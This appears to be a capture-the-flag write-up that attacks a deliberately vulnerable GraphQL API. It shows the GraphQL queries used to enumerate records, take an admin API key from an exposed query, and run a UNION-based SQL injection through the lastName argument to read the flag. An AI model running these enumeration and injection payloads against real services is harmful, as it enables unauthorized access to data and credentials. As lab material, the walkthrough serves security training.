Exploit the vulnerable GraphQL API to obtain the flag
```
{
 "query":"{allEmployees { id username employeeId role }}"
}
{
 "query":"{employeeByUsername(username: \"21y4d'\") { id username employeeId role }}"
}
```
- employeeByUsername is not vulnerable

```
{
 "query":"{allProducts { id name stock }}"
}
{
 "query":"{productByName(name: \"CPU' -- -\") { id name stock }}"
}
```
- productByName is not vulnerable either

```
{
 "query":"{activeApiKeys { id role key }}"
}
```
- "id":"QXBpS2V5T2JqZWN0OjM=","role":"admin","key":"0711a879ed751e63330a78a4b195bbad"

```
{
 "query":"{allCustomers(apiKey: \"0711a879ed751e63330a78a4b195bbad\") { id firstName lastName address }}"
}
{
 "query":"{customerByName(apiKey: \"0711a879ed751e63330a78a4b195bbad\",lastName: \"Blair'\"){ id firstName lastName address }}"
}
```
- lastName field vulnerable to SQL injection!

**Flag
```
{
 "query":"{customerByName(apiKey: \"0711a879ed751e63330a78a4b195bbad\",lastName: \"x' UNION SELECT 1,2,flag,4 FROM db.flag-- -\") { lastName }}"
}
```
